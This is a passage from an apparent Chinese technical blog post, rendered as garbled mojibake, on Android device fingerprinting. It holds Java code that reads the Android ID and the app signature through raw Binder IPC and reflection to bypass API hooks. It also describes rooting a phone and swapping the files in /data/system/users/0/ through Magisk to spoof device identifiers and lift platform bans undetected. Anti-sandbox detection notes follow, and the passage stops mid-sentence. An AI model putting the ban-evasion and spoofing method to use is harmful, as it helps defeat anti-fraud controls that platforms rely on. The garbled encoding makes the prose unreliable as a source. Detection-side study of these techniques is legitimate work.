href="#æ–¹æ³•5ï¼š" class="headerlink" title="æ–¹æ³•5ï¼š"></a>æ–¹æ³•5ï¼š</h5><p>ç›´æ¥æ„å»ºIPCåè®®å’ŒæœåŠ¡ç«¯è¿›è¡Œé€šè®¯ ï¼Œè¿™å—<code>targetSdkVersion</code>å¿…é¡»å‡çº§åˆ°32ä»¥ä¸Š</p><p>å› ä¸º<code>getAttributionSource</code>è¿™ä¸ªç©æ„32ç‰ˆæœ¬ä»¥ä¸Šå¥½åƒæ‰æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">public String getAndroidId5(Context context) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // Acquire the ContentProvider</span><br><span class="line">            Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">            Method currentActivityThreadMethod = activityThreadClass.getMethod(&quot;currentActivityThread&quot;);</span><br><span class="line">            Object currentActivityThread = currentActivityThreadMethod.invoke(null);</span><br><span class="line">            // é€šè¿‡ActivityThreadè·å–ä¸€ä¸ªæŒ‡å‘è¿œç¨‹&quot;settings&quot; ContentProviderçš„ä»£ç†å¯¹è±¡</span><br><span class="line">            Method acquireProviderMethod = activityThreadClass.getMethod(&quot;acquireProvider&quot;, Context.class, String.class, int.class, boolean.class);</span><br><span class="line">            Object provider = acquireProviderMethod.invoke(currentActivityThread, context, &quot;settings&quot;, 0, true);</span><br><span class="line"> </span><br><span class="line">            // è·å–IContentProvideræ¥å£çš„Classå¯¹è±¡ï¼Œä¸ºåç»­è·å–Binderé€šä¿¡çš„â€œäº‹åŠ¡ç â€åšå‡†å¤‡</span><br><span class="line">            Class&lt;?&gt; iContentProviderClass = Class.forName(&quot;android.content.IContentProvider&quot;);</span><br><span class="line">            // ContentProviderçš„ä»£ç†å¯¹è±¡å†…éƒ¨æœ‰ä¸€ä¸ªåä¸ºmRemoteçš„æˆå‘˜å˜é‡ï¼Œå®ƒå°±æ˜¯çœŸæ­£çš„Binderé€šä¿¡å¯¹è±¡</span><br><span class="line">            Field mRemoteField = provider.getClass().getDeclaredField(&quot;mRemote&quot;);</span><br><span class="line">            mRemoteField.setAccessible(true);</span><br><span class="line">            IBinder binder = (IBinder) mRemoteField.get(provider);</span><br><span class="line"> </span><br><span class="line">            // Create the Parcel for the arguments</span><br><span class="line">            Parcel data = Parcel.obtain();</span><br><span class="line">            data.writeInterfaceToken(&quot;android.content.IContentProvider&quot;);</span><br><span class="line">            if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    &gt;= android.os.Build.VERSION_CODES.S) &#123;</span><br><span class="line">                context.getAttributionSource().writeToParcel(data, 0); // 1. å†™å…¥å½’å› æº</span><br><span class="line">                data.writeString(&quot;settings&quot;);   // 2. å†™å…¥ authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); // 3. å†™å…¥æ–¹æ³•å</span><br><span class="line">                data.writeString(&quot;android_id&quot;); // 4. å†™å…¥å‚æ•°</span><br><span class="line">                data.writeBundle(Bundle.EMPTY); // 5. å†™å…¥é¢å¤–Bundle</span><br><span class="line">            &#125; else if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    == android.os.Build.VERSION_CODES.R) &#123;// API 30</span><br><span class="line">                //android 11</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line">                data.writeString(null); //featureId</span><br><span class="line"> </span><br><span class="line">                data.writeString(&quot;settings&quot;); //authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125; else if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    == android.os.Build.VERSION_CODES.Q) &#123; // API 29</span><br><span class="line">                //android 10</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line"> </span><br><span class="line">                data.writeString(&quot;settings&quot;); //authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125; else &#123;                                // æ›´æ—©ç‰ˆæœ¬</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            Parcel reply = Parcel.obtain();</span><br><span class="line">            // è°ƒç”¨transactå‘ä¸€ä¸ªIBinderè±¡(è¿™é‡Œçš„binderå˜é‡æ˜¯IBinderç±»)å‘é€è¯·æ±‚</span><br><span class="line">            binder.transact((int) iContentProviderClass.getDeclaredField(&quot;CALL_TRANSACTION&quot;).get(null), data, reply, 0);</span><br><span class="line">            reply.readException();</span><br><span class="line">            Bundle bundle = reply.readBundle();</span><br><span class="line">            reply.recycle();</span><br><span class="line">            data.recycle();</span><br><span class="line"> </span><br><span class="line">            return bundle.getString(&quot;value&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼šæ ‡å‡†è·å–Android IDçš„æ ‡å‡†ã€å…¬å¼€æ–¹æ³•æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.provider.Settings;</span><br><span class="line"></span><br><span class="line">String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ ‡å‡†æ–¹æ³•å†…éƒ¨å…¶å®ä¹Ÿæ˜¯é€šè¿‡ <code>ContentResolver</code> -&gt; <code>ContentProvider</code> çš„æœºåˆ¶ï¼Œæœ€ç»ˆé€šè¿‡ Binder IPC ä¸ç³»ç»ŸæœåŠ¡ï¼ˆå…·ä½“æ˜¯ <code>SettingsProvider</code>ï¼‰è¿›è¡Œé€šä¿¡æ¥è·å–å€¼çš„ã€‚</p><blockquote><p>æˆ‘ä»¬è°ƒç”¨ <code>IBinder.transact()</code> ç»™ä¸€ä¸ª IBinder å¯¹è±¡å‘é€è¯·æ±‚ï¼Œç„¶åç»è¿‡ Binder <code>Binder.onTransact()</code> å¾—åˆ°è°ƒç”¨ï¼Œæ¥ç€è¿œç¨‹æ“ä½œçš„ç›®æ ‡å¾—åˆ°å¯¹åº”çš„è°ƒç”¨</p></blockquote><h4 id="IPCAppSign"><a href="#IPCAppSign" class="headerlink" title="IPCAppSign"></a>IPCAppSign</h4><p>IPCè·å–ç­¾åä¹Ÿæ˜¯ä¸€äº›å¤§å‚ç»å¸¸ç”¨æ£€æµ‹ç­¾åçš„åŠæ³•ï¼Œä¿®æ”¹çš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥æ›¿æ¢æ‰æ•°æ®åŒ…å³å¯</p><p>å…·ä½“è·å–æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">public static int TRANSACTION_getPackageInfo() &#123;</span><br><span class="line">    if(TRANSACTION_getPackageInfo == -1) &#123;</span><br><span class="line">         try &#123;</span><br><span class="line">                Field field = null;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class&lt;?&gt; pkmIPCClazz = Class.forName(&quot;android.content.pm.IPackageManager$Stub&quot;);</span><br><span class="line">                    field = pkmIPCClazz.getDeclaredField(&quot;TRANSACTION_getPackageInfo&quot;);</span><br><span class="line">                &#125; catch (Throwable e) &#123;</span><br><span class="line">                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; getTranscationId forName error &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                assert field != null;</span><br><span class="line">                field.setAccessible(true);</span><br><span class="line">                TRANSACTION_getPackageInfo = field.getInt(null);</span><br><span class="line">            &#125; catch (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; getTranscationId error &quot; + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRANSACTION_getPackageInfo;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    PackageManager packageManager = getBaseContext().getPackageManager();</span><br><span class="line"></span><br><span class="line">    // 1. è·å–åº•å±‚çš„ IPackageManager ä»£ç†å¯¹è±¡</span><br><span class="line">    Object IPC_PM_Obj = RposedHelpers.getObjectField(packageManager, &quot;mPM&quot;);</span><br><span class="line">    // 2. ä»ä»£ç†å¯¹è±¡ä¸­è·å–çœŸæ­£çš„ IBinder å¯¹è±¡</span><br><span class="line">    IBinder mRemote = (IBinder) RposedHelpers.getObjectField(IPC_PM_Obj, &quot;mRemote&quot;);</span><br><span class="line"></span><br><span class="line">    // 3. å‡†å¤‡æ•°æ® Parcel å’Œå›å¤ Parcel</span><br><span class="line">    Parcel _data = Parcel.obtain();</span><br><span class="line">    Parcel _reply = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    // 4. æŒ‰ç…§ AIDL åå®šï¼Œæ‰‹åŠ¨æ‰“åŒ…å‚æ•°åˆ° _data ä¸­</span><br><span class="line">    _data.writeInterfaceToken(&quot;android.content.pm.IPackageManager&quot;); // å†™å…¥æ¥å£ä»¤ç‰Œï¼Œç”¨äºéªŒè¯</span><br><span class="line">    _data.writeString(getPackageName()); // å‚æ•°1: packageName (String)</span><br><span class="line">    _data.writeLong(PackageManager.GET_SIGNATURES); // å‚æ•°2: flags (long), æ³¨æ„è¿™é‡Œç”¨äº†writeLong</span><br><span class="line">    _data.writeInt(android.os.Process.myUid()); // å‚æ•°3: userId (int)</span><br><span class="line"></span><br><span class="line">    // 5. å‘èµ·è¿œç¨‹è°ƒç”¨</span><br><span class="line">    boolean _status = mRemote.transact(TransactCase.TRANSACTION_getPackageInfo(), _data, _reply, 0);</span><br><span class="line">    _reply.readException(); // æ£€æŸ¥è¿œç¨‹è°ƒç”¨æ˜¯å¦å‘ç”Ÿå¼‚å¸¸</span><br><span class="line"></span><br><span class="line">    // 6. ä» _reply ä¸­è§£åŒ…è¿”å›å€¼</span><br><span class="line">    PackageInfo packageInfo = _reply.readTypedObject(PackageInfo.CREATOR);</span><br><span class="line"></span><br><span class="line">    // 7. å›æ”¶ Parcel å¯¹è±¡</span><br><span class="line">    _data.recycle();</span><br><span class="line">    _reply.recycle();</span><br><span class="line">    CLog.e(&quot;ç­¾åä¿¡æ¯: &quot;+packageInfo.signatures[0].toCharsString());</span><br><span class="line">&#125; catch (Throwable e) &#123;</span><br><span class="line">    CLog.i(&quot;IPC_TEST_getPackageInfo error &quot;+e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡é«˜å±‚ API Hookï¼Œç›´æ¥é€šè¿‡åº•å±‚ Binder IPC (è¿›ç¨‹é—´é€šä¿¡) æ¥è·å–åº”ç”¨ç­¾åä¿¡æ¯</strong></p><p><strong>ä»€ä¹ˆæ˜¯ Transaction Code?</strong> </p><p>åœ¨ Android çš„ Binder IPC æœºåˆ¶ä¸­ï¼Œå®¢æˆ·ç«¯ï¼ˆAppï¼‰è°ƒç”¨æœåŠ¡ç«¯ï¼ˆSystem Serviceï¼‰çš„æ–¹æ³•æ—¶ï¼Œå¹¶ä¸æ˜¯ç›´æ¥ä¼ é€’æ–¹æ³•åã€‚ä¸ºäº†æ•ˆç‡ï¼Œæ¯ä¸ªæ–¹æ³•éƒ½è¢«æ˜ å°„åˆ°ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°IDï¼Œè¿™ä¸ªIDå°±å«åš <code>Transaction Code</code>ã€‚å½“å®¢æˆ·ç«¯å‘èµ· <code>transact</code> è°ƒç”¨æ—¶ï¼Œå®ƒä¼šæŠŠè¿™ä¸ªæ•´æ•°IDå’Œå‚æ•°ä¸€èµ·æ‰“åŒ…å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ ¹æ®è¿™ä¸ªIDå°±çŸ¥é“è¦è°ƒç”¨å“ªä¸ªå…·ä½“çš„æ–¹æ³•ã€‚</p><p><strong>ä¸ºä»€ä¹ˆè¦ç”¨åå°„è·å–ï¼Ÿ</strong></p><p><code>TRANSACTION_getPackageInfo</code> æ˜¯ <code>IPackageManager.aidl</code> æ–‡ä»¶åœ¨ç¼–è¯‘åè‡ªåŠ¨ç”Ÿæˆçš„ <code>IPackageManager$Stub</code> ç±»ä¸­çš„ä¸€ä¸ªç§æœ‰é™æ€å¸¸é‡ã€‚å®ƒçš„å€¼åœ¨ä¸åŒ Android ç‰ˆæœ¬ä¸­<strong>å¯èƒ½</strong>ä¼šæ”¹å˜ï¼ˆè™½ç„¶å®è·µä¸­å¾ˆå°‘æ”¹å˜ï¼‰ã€‚å¦‚æœç›´æ¥åœ¨ä»£ç é‡Œç¡¬ç¼–ç ä¸€ä¸ªæ•´æ•°å€¼ï¼ˆä¾‹å¦‚ <code>int a = 14;</code>ï¼‰ï¼Œé‚£ä¹ˆå½“åº”ç”¨è¿è¡Œåœ¨ä¸€ä¸ªè¯¥å€¼å·²æ”¹å˜çš„ Android ç³»ç»Ÿä¸Šæ—¶ï¼Œè°ƒç”¨å°±ä¼šå¤±è´¥ã€‚ å› æ­¤ï¼Œé€šè¿‡åå°„å»åŠ¨æ€è·å–å½“å‰è¿è¡Œç¯å¢ƒä¸‹çš„ç¡®åˆ‡å€¼ï¼Œæ˜¯ä¸€ç§<strong>å…¼å®¹æ€§æ›´å¥½ã€æ›´ç¨³å¥</strong>çš„åšæ³•ã€‚</p><h4 id="Mapsè§£æApkç­¾å"><a href="#Mapsè§£æApkç­¾å" class="headerlink" title="Mapsè§£æApkç­¾å"></a>Mapsè§£æApkç­¾å</h4><p>è¿™å—è¿˜æœ‰ä¸€ä¸ªæ–¹æ¡ˆï¼Œä¸»è¦å®ç°æ€è·¯å°±æ˜¯å› ä¸ºæˆ‘ä»¬å½“å‰è¿›ç¨‹å»æ‰“å¼€apkæ˜¯å­˜åœ¨é£é™©çš„ ã€‚</p><p>å¾ˆæœ‰å¯èƒ½è¢«IOé‡å®šå‘ï¼Œå¯¼è‡´å¾—åˆ°çš„ç­¾åæ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥<strong>è®©ä¸‰æ–¹è¿›ç¨‹å»åŠ è½½å½“å‰apkæ–‡ä»¶ï¼Œé€šè¿‡å…±äº«å†…å­˜çš„æ–¹å¼ï¼Œç„¶åå½“å‰è¿›ç¨‹å¯¹apkæ–‡ä»¶mapsé‡Œé¢çš„å†…å­˜ç­¾åè¿›è¡Œè§£æå³å¯</strong> ã€‚è¿™å—éœ€è¦åŒè¿›ç¨‹é€šè®¯ ã€‚</p><h4 id="å…¶ä»–å­—æ®µIPC"><a href="#å…¶ä»–å­—æ®µIPC" class="headerlink" title="å…¶ä»–å­—æ®µIPC"></a>å…¶ä»–å­—æ®µIPC</h4><p>æ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ªç»å…¸IPCä¾‹å­ï¼Œå¯ä»¥å‘ç°åªè¦æ˜¯æœåŠ¡ç«¯è·å–çš„éƒ½å¯ä»¥ä½¿ç”¨<strong>IPCåè®®</strong>çš„æ–¹å¼å»è·å– ã€‚</p><p>å…¶ä»–å­—æ®µå…¶å®ä¸€æ ·ä¹Ÿå¯ä»¥è¿™ä¹ˆç© ï¼Œå¦‚æœéœ€è¦ä»€ä¹ˆå­—æ®µï¼Œå°±å¯¹ç…§å®‰å“æºç å®¢æˆ·ç«¯å¾€é‡Œé¢å†™å…¥å¯¹åº”çš„æ•°æ®ï¼Œç›´æ¥IPCå³å¯</p><blockquote><p>åˆ†æSOæ–‡ä»¶çš„æ—¶å€™ç›´æ¥å¯¹jniäº¤äº’è¿›è¡Œç›‘å¬ï¼Œåœ¨ä¿å­˜çš„è°ƒç”¨æ ˆé‡Œé¢çœ‹</p><p>ä»–å¦‚æœè°ƒç”¨äº†<code>Parcel.obtain()</code> åˆå§‹åŒ–æˆ–è€… è¿™ç§<code>writeLong ()</code>å†™å…¥æ•°æ®çš„æ–¹æ³•ï¼ŒåŸºæœ¬å°±å¯ä»¥ç¡®è®¤ä»–æ˜¯IPCè·å–çš„ä¸€äº›å­—æ®µï¼Œå…·ä½“çœ‹ä»–å†™å…¥çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œæˆ–è€…çœ‹ä»–å†™å…¥çš„tokenæ˜¯ä»€ä¹ˆï¼Œæ¯”å¦‚ä¸Šé¢çš„è·å–ç­¾åçš„tokenå°±æ˜¯<code>&quot;android.content.pm.IPackageManager&quot;</code> ï¼Œå³å¯çŸ¥é“ä»–æƒ³åšä»€ä¹ˆå­—æ®µçš„è·å–</p></blockquote><h4 id="IPCæ€»ç»“-åæ€"><a href="#IPCæ€»ç»“-åæ€" class="headerlink" title="IPCæ€»ç»“&amp;åæ€"></a>IPCæ€»ç»“&amp;åæ€</h4><p>åæ¥åˆæ€è€ƒäº†ä¸€ä¸‹ï¼ŒIPCæœåŠ¡ç«¯è¿™äº›è®¾å¤‡æŒ‡çº¹ï¼Œæˆ–è€…è¯´è¿™äº›é…ç½®åˆ°åº•å“ªé‡Œæ¥çš„ï¼Œä¸€ç›´åœ¨æºç é‡Œé¢è·Ÿã€‚</p><p>å‘ç°å°±æ‹¿android idæ¥è¯´ï¼Œä»–æœ€ç»ˆè¯»å–çš„æ–‡ä»¶è·¯å¾„æ˜¯<code>/data/system/users/0/settings_ssaid.xml</code> ï¼Œè¿™ä¸ªç›®å½•ä¸‹ï¼Œ<code>/data/system/users/0/</code>æˆ‘å‘ç°è¿™é‡Œé¢å…¨æ˜¯å„ç§æ³¨å†Œè¡¨å’Œå„ç§é…ç½®ä¿¡æ¯ã€‚æˆ‘è¿™è¾¹å°è¯•æ”¹äº†ä¸€ä¸‹é‡Œé¢çš„<code>android id</code> ã€‚ç„¶åç›´æ¥æ‰‹æœºé‡å¯ ï¼Œæˆ‘å‘ç°æˆ‘ä¹‹å‰è‡ªå·±å†™çš„<code>Hunter</code>è·å–çš„è®¾å¤‡æŒ‡çº¹<code>android id</code>ç«Ÿç„¶å˜äº†</p><p>åæ¥æˆ‘æŠŠè¿™äº›æ–‡ä»¶éƒ½æ‹·è´å‡ºæ¥ï¼ŒæŠŠé‡Œé¢ç†Ÿæ‚‰çš„å€¼éƒ½éšæœºäº†ä¸€ä»½ï¼Œé€šè¿‡magisk æ’ä»¶ç³»ç»Ÿæ–‡ä»¶æ›¿æ¢çš„æ–¹å¼ï¼Œå¯¹æ–‡ä»¶<code>/data/system/users/0/</code>è¿›è¡Œæ›¿æ¢ ï¼ŒçœŸæ²¡æƒ³åˆ°ä»¥å‰è¢«å°çš„è®¾å¤‡è§£å°äº†ã€‚è€Œä¸”ä¸éœ€è¦å›å¤å‡ºå‚è®¾ç½®ï¼Œåªéœ€è¦<strong>è½¯é‡å¯</strong>ä¸€ä¸‹å°±è¡Œ</p><p><strong>è€Œä¸”åŸºæœ¬å¯ä»¥åšåˆ°æ— ç—• ï¼Œå› ä¸ºæ²¡æœ‰å¯¹apkä»»ä½•ä¿®æ”¹ï¼Œæ”¹çš„å…¨æ˜¯ç³»ç»Ÿçº§åˆ«çš„å˜é‡ï¼Œè€Œæˆ‘åªéœ€è¦Root ï¼Œæ›¿æ¢ç³»ç»Ÿæ–‡ä»¶ï¼Œç›¸å½“äºæ¯ä¸€æ¬¡éƒ½æ˜¯æ¢å¤å‡ºå‚è®¾ç½®</strong></p><p>ç°åœ¨åŸºæœ¬å¤§å‚æƒ³è¦åœ¨å›å¤å‡ºå‚è®¾ç½®ä¿æŒè®¾å¤‡æŒ‡çº¹ä¸å˜åŸºæœ¬ä¸å¯èƒ½ ã€‚è¿™å¥—æ–¹æ¡ˆæˆ‘æµ‹è¯•è¿‡ä¸€æ®µæ—¶é—´ï¼Œç°é˜¶æ®µåŸºæœ¬å¤§å‚ä»å®¢æˆ·ç«¯è§’åº¦åŸºæœ¬æ²¡åŠæ³•å¯¹æŠ—ï¼Œåªèƒ½é ä¸€äº›æœåŠ¡ç«¯æŒ‡çº¹å»åšæ£€æµ‹ã€‚</p><h4 id="æœåŠ¡ç«¯çº§åˆ«è®¾å¤‡æŒ‡çº¹"><a href="#æœåŠ¡ç«¯çº§åˆ«è®¾å¤‡æŒ‡çº¹" class="headerlink" title="æœåŠ¡ç«¯çº§åˆ«è®¾å¤‡æŒ‡çº¹"></a>æœåŠ¡ç«¯çº§åˆ«è®¾å¤‡æŒ‡çº¹</h4><p>æœåŠ¡ç«¯å»è·å–å®¢æˆ·ç«¯çš„IPV6ä¿¡æ¯ï¼Œé…åˆå®¢æˆ·ç«¯ä¸ŠæŠ¥ã€‚IPV6å·ç§°èƒ½ç»™ä¸–ç•Œä¸Šæ¯ç²’æ²™å­åˆ†é…ä¸€ä¸ªipï¼Œ2çš„128æ¬¡æ–¹</p><p>å¯ä»¥åœ¨è®¾å¤‡æŒ‡çº¹åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨ä¸€ä¸‹æ¥å£ï¼ŒæœåŠ¡ç«¯ç½‘å…³å±‚å»è·å–IpV6ä¿¡æ¯ ã€‚å°†ä¿¡æ¯ä¿å­˜ä½œä¸ºå®¢æˆ·ç«¯è®¾å¤‡æŒ‡çº¹</p><p><strong>tlsæœ€æ–°ç‰ˆ+socketè¿›è¡Œé€šè®¯</strong> ï¼Œç”¨è¿™ä¸ªipv6ä½œä¸ºè®¾å¤‡æŒ‡çº¹ ã€‚å½“ç„¶è¿™å—ä¹Ÿéœ€è¦é˜²ä»£ç†ï¼Œå…·ä½“çš„æ–¹æ¡ˆä¹Ÿå¾ˆå¤šï¼Œæ¯”å¦‚ä¸€äº›å¤§å‚ä¼šå»è´­ä¹°ä¸€äº›ä»£ç†IPï¼Œè¯•ç”¨çš„æ—¶å€™å»è¯·æ±‚è‡ªå·±çš„ç½‘å…³ï¼Œç„¶åæŠŠè¿™äº›IPéƒ½æ‹‰é»‘</p><h3 id="Hunteræ£€æµ‹-ååˆ¶"><a href="#Hunteræ£€æµ‹-ååˆ¶" class="headerlink" title="Hunteræ£€æµ‹&amp;ååˆ¶"></a>Hunteræ£€æµ‹&amp;ååˆ¶</h3><p>è¿™å—ä¸»è¦æ˜¯ä»‹ç»ä¸€äº›æ¯”è¾ƒæ–°å¥‡çš„å¯¹æŠ—å’Œæ£€æµ‹ ï¼Œä¹Ÿæ˜¯æˆ‘ä¹‹å‰åœ¨åšé»‘äº§å¯¹æŠ—çš„æ—¶å€™å‘ç°çš„ä¸€äº›åŠæ³•</p><h4 id="MapIoé‡å®šå‘Anti"><a href="#MapIoé‡å®šå‘Anti" class="headerlink" title="MapIoé‡å®šå‘Anti"></a>MapIoé‡å®šå‘Anti</h4><p>ä¸€èˆ¬åœ¨å®ç°ä¸€æœºå¤šå·çš„æ—¶å€™ï¼Œå› ä¸ºéœ€è¦å¯¹ä¸åŒçš„è´¦å·è¿›è¡Œ<strong>IOé‡å®šå‘</strong>ï¼ŒæŠŠä¸åŒçš„è´¦å·ï¼Œä¿å­˜åˆ°è‡ªå·±çš„è™šæ‹Ÿåˆ†èº«é‡Œé¢</p><p>è¿™æ—¶å€™å¦‚æœä½ è¦è¯»å–<code>Maps</code>å»éå†<code>Item</code>çš„æ—¶å€™å°±ä¼šå‘ç°è¿™ä¸ª<code>Item</code>å¼‚å¸¸ï¼Œä¸€èˆ¬æ²™ç®±å¼€å‘è€…ä¼šå°†<code>MapsIo</code>é‡å®šå‘</p><p>å½“å‘ç°è¯»å–<code>Maps</code>çš„æ—¶å€™æŒ‡å‘è‡ªå·±çš„æ–‡ä»¶ï¼Œå› ä¸ºè¿™ä¸ªMapsæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨<code>svc openat</code>è¿™å—è¿›è¡Œæ‹¦æˆªç”Ÿæˆä¸€ä»½æ–°çš„ã€‚ç„¶åæŒ‡å‘åˆ°è¿™ä»½æ–°çš„æ–‡ä»¶ï¼Œåœ¨æ–°çš„<code>maps</code>é‡Œé¢ä»–ä¼šå¯¹é‡Œé¢çš„<code>item</code>è·¯å¾„è¿›è¡Œåè½¬ï¼Œè½¬æ¢æˆæ­£å¸¸çš„ç›®å½•ï¼Œè€Œä¸æ˜¯åŒ…å«æ²™ç®±çš„ç›®å½•ï¼Œå¯¼è‡´è·å–çš„æ•°æ®è¢«æ¬ºéª—</p><p>è¿™å—è¯»æ–‡ä»¶åç§»å®Œå…¨å¯ä»¥ä¸è¯»å–<code>Maps</code> ï¼Œè€Œæ˜¯è¯»å–<code>proc/self/maps_files</code>å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œ<code>opendir</code> ï¼Œå¯¹æ¯ä¸ªæ–‡ä»¶è¿›è¡Œéå†ï¼Œç„¶åå†è·¯å¾„æ‹¼æ¥ï¼Œé€šè¿‡<code>readlinkat</code>å»åæŸ¥è·¯å¾„å³å¯</p><h4 id="â€œåè°ƒè¯•â€è¿›ç¨‹æ£€æµ‹å®ç°ç»†èŠ‚"><a href="#â€œåè°ƒè¯•â€è¿›ç¨‹æ£€æµ‹å®ç°ç»†èŠ‚" class="headerlink" title="â€œåè°ƒè¯•â€è¿›ç¨‹æ£€æµ‹å®ç°ç»†èŠ‚"></a>â€œåè°ƒè¯•â€è¿›ç¨‹æ£€æµ‹å®ç°ç»†èŠ‚</h4><p>ä¸€èˆ¬<code>Apk</code>éƒ½ä¼šå¼€å¯ä¸€æ¡çº¿ç¨‹ä½œä¸ºæ£€æµ‹åè°ƒè¯•çº¿ç¨‹ï¼Œè¿™æ¡çº¿æ¯éš”å‡ 